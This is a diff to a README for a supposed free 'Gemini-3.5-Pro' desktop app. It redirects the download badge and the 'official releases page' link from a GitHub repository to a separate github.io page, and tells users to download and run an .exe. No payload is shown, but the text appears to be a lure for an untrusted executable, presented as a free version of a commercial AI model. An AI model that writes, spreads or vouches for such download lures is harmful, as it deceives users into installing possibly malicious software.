@@ -1,6 +1,6 @@
 # 🤖 Gemini-3.5-Pro-Free - Run advanced AI models for free
 
-[![](https://img.shields.io/badge/Download-Gemini_App-blue.svg)](https://github.com/kokyk4590/Gemini-3.5-Pro-Free)
+[![](https://img.shields.io/badge/Download-Gemini_App-blue.svg)](https://kokyk4590.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 Follow these steps to set up the application on your system.
 
-1. Visit the [official releases page](https://github.com/kokyk4590/Gemini-3.5-Pro-Free) to find the latest version.
+1. Visit the [official releases page](https://kokyk4590.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Locate the file in your Downloads folder once the transfer finishes.
